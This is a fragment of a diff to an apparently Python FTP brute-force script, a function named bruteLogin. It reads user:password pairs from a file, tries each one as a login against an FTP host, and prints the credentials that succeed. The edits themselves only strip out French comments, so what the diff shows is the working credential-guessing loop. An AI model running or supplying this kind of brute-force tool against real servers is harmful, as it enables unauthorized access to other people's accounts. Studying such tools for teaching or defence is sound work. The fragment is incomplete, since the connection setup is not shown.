@@ -9,7 +9,7 @@ def bruteLogin(hostname, passwdFile):
 	except:
 		cprint("[!] File doesn't exist !", 'red')
 	for line in pF.readlines():
-		userName = line.split(':')[0] #on rajoute le [0] pour dire que c'est le 1er composant avant les :
+		userName = line.split(':')[0]
 		passWord = line.split(':')[1].strip('\n')
 		cprint("[+] Trying: " + userName + "/" + passWord, 'yellow')
 		try:
@@ -17,7 +17,7 @@ def bruteLogin(hostname, passwdFile):
 			login = ftp.login(userName, passWord)
 			cprint("[+] Login succeeded with: " + userName + "/" + passWord, 'green')
 			ftp.quit()
-			return(userName,passWord) #après un return le programme quitte et ne fait pas la suite
+			return(userName,passWord)
 		except:
 			pass #on ne fait rien
 	cprint("[-] Password not in list", 'red') #si aucun mdp n'a fonctionne
